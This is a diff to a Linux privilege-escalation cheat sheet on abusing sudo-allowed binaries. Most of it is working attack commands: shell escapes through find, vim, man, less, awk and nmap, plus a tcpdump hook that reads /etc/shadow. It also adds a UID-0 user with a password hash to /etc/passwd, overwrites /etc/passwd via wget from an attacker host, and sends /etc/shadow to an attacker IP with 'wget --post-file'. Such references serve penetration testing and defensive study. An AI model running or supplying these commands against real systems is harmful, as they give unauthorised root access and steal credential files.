@@ -1,15 +1,10 @@
----- Credits to Touhid M.Shaikh ----
+---- Credits to Touhid M.Shaikh @ https://touhidshaikh.com/blog/?p=790 ----
 
 
 Sudoers File
 
-  
+    /etc/sudoers
 
-SUDOers
-
-
-    sudo -l
-  
 Sudoer File Syntax.
 
     root ALL=(ALL) ALL
@@ -27,17 +22,42 @@ Explain 2: The above command, makes the user user1 can from any terminal, run th
 Explain 3:  The above command, make the user touhid can from any terminal, run the command find as root user without password.
 
 
-Exploiting SUDO Users.
-To Exploiting sudo user u need to find which command u have to allow.
+
+Find out what SUDO permissions you have. The user may run these binary files without as root without password
 
     sudo -l
 
-The above command shows which command have allowed to the current user.
+---- Listing ----
+
+Here is a brief list of the exploitable binaries. Exact commands are in next section
+
+    awk
+    find
+    less
+    man
+    more
+    nano
+    nmap
+    wget
+    vim
+
+Secondary List, not tested
+
+sudo mount -o bind /bin/bash /bin/mount
+sudo mount
 
 
-Here sudo -l, Shows the user has all this binary allowed to do as on root user without password.
+$ echo $’id\ncat /etc/shadow’ > /tmp/.test
+$ chmod +x /tmp/.test
+$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 
-Let’s take a look at all binary one by one (which is mention in index only) and Escalate Privilege to root user.
+sudo strace -o/dev/null /bin/bash
+
+
+
+---- Individual Commands ----
+
+
 
 Using Find Command
 
@@ -47,7 +67,9 @@ Using Find Command
     sudo find /bin -name nano -exec /bin/sh \;
 
 Using Vim Command
+
     sudo vim -c '!sh'
+    
 Using Nmap Command
 Old way.
 
@@ -62,14 +84,18 @@ Latest Way without –interactive
 
 
 Using Man Command
+
     sudo man man
+
 after that press !sh and hit enter
+
 
 Using Less/More Command
 
     sudo less /etc/hosts
     sudo more /etc/hosts
     after that press !sh and hit enter
+
 
 Using awk Command
 
@@ -78,13 +104,16 @@ Using awk Command
 Using nano Command
 nano is text editor using this editor u can modify passwd file and add a user in passwd file as root privilege after that u need to switch user. Add this line in /etc/passwd to order to add the user as root privilege.
 
+    sudo nano  /etc/passwd
+    add this line:
     user1:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
 
-sudo nano  /etc/passwd
+
 now switch user password with password : test
 
     su user1
     
+
 
 Using wget Command
 this very cool way which requires a Web Server to download a file. This way i never saw on anywhere. lets explain this.
@@ -100,23 +129,39 @@ append this line only =>
 host that passwd file to using any web server.
 On Victim Side.
 
-sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
-now switch user password is : test
+    sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
+    
+now switch user password  : test
 
     su user1
+
+
 Note: if u want to dump file from a server like a root’s ssh key, Shadow file etc.
 
-sudo wget --post-file=/etc/shadow 192.168.56.1:8080
-Setup Listener on attacker : nc –lvp 8080
+    sudo wget --post-file=/etc/shadow 192.168.56.1:8080
+    Setup Listener on attacker : nc –lvp 8080
 
+
+---- Other ----
 Using apache Command
 sadly u cant get Shell and Cant edit system files.
 
 but using this u can view system files.
 
-sudo apache2 -f /etc/shadow
+    sudo apache2 -f /etc/shadow
+
+
 Output is like this :
 
-Syntax error on line 1 of /etc/shadow:
-Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
+    Syntax error on line 1 of /etc/shadow:
+    Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
+
+
 Sadly no Shell. But you manage to extract root hash now Crack hash in your machine. For Shadow Cracking click here for more.
+
+
+
+
+Super long list here:
+
+https://gtfobins.github.io/
